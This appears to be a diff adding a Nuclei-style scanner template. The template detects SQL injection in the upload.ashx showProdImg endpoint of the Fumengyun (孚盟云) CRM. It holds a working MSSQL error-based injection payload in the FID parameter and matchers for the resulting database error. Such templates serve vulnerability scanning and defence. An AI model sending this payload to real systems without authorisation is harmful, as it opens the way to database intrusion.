@@ -1,0 +1,24 @@
+id: fumengyun-upload_ashx-showProdImg-sql
+
+info:
+  name: 孚盟云 upload.ashx showProdImg SQL延时注入漏洞
+  author: fumengyun
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /Ajax/upload.ashx?action=showProdImg&FID=1')+AND+1=@@VERSION-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Microsoft SQL'
+          - '转换成数据类型 int 时失败'
+        condition: and
+      - type: status
+        status: 
+          - 500
